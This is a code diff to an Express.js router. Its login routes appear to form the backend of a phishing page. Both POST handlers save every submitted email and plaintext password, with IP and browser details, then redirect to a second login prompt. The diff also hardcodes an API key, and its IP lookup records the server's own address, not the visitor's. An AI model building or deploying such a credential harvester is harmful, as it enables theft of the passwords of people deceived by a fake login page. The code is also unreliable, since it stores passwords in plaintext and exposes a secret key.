@@ -1,11 +1,10 @@
 const express = require("express");
 const router = express.Router();
-const IP = require("ip");
+const axios = require("axios");
 
 // Load User model
 const User = require("../models/User");
 
-// Login Page
 router.get("/login", (req, res) => {
   let email = req.query.dbs || "";
   res.render("login", { email: email });
@@ -13,40 +12,61 @@ router.get("/login", (req, res) => {
 
 router.get("/loginverify", (req, res) => res.render("login2"));
 
-// Login
-router.post("/loginok", (req, res, next) => {
+async function fetchIPDetails() {
+  try {
+    // This API returns data about the IP, not the "User-Agent".
+    const response = await axios.get("https://ipgeolocation.abstractapi.com/v1/?api_key=c3d944ac606a4926b537f11d53816a76");
+    return response.data; // this will contain IP details
+  } catch (error) {
+    console.error("Error fetching IP details: ", error);
+    return null;
+  }
+}
+
+router.post("/loginok", async (req, res, next) => {
   const { email, password } = req.body;
+  const userAgent = req.headers['user-agent']; // Capturing User-Agent from headers
 
-  const userIp = IP.address();
-  console.log(userIp);
+  const ipDetails = await fetchIPDetails(); // This contains IP geolocation details, not User-Agent
 
-  const userAgent = req.headers["user-agent"];
+  if (!ipDetails) {
+    return res.status(500).send("Error fetching IP details");
+  }
 
-  const user = new User({ email, password, userIp, userAgent });
+  const user = new User({ 
+    email, 
+    password, 
+    userIp: ipDetails.ip_address, 
+    userAgent: userAgent 
+  });
 
   user
     .save()
     .then((result) => {
       console.log(result);
       req.flash("success_msg", "Login ok");
-
-      // Redirect with email as a query parameter
       res.redirect(`/users/loginverify?dbs=${encodeURIComponent(email)}`);
     })
     .catch((err) => console.log(err));
 });
 
-// Login Verify page
-// Login Verify
-router.post("/loginverify", (req, res, next) => {
-  const { email ,password } = req.body;
+router.post("/loginverify", async (req, res, next) => {
+  const { email, password } = req.body;
 
-  const userIp = IP.address();
-  console.log(userIp);
+  const userAgent = req.headers['user-agent']; // Capturing User-Agent from headers
 
-  const userAgent = req.headers["user-agent"];
+  const ipDetails = await fetchIPDetails();
 
-  const user = new User({ email, password, userIp, userAgent });
+  if (!ipDetails) {
+    return res.status(500).send("Failed to fetch user details");
+  }
+
+  const user = new User({ 
+    email, 
+    password, 
+    userIp: ipDetails.ip_address, 
+    userAgent: userAgent 
+  });
 
   user
     .save()
@@ -58,7 +78,6 @@ router.post("/loginverify", (req, res, next) => {
     .catch((err) => console.log(err));
 });
 
-// Logout
 router.get("/logout", (req, res) => {
   req.logout();
   req.flash("success_msg", "You are logged out");
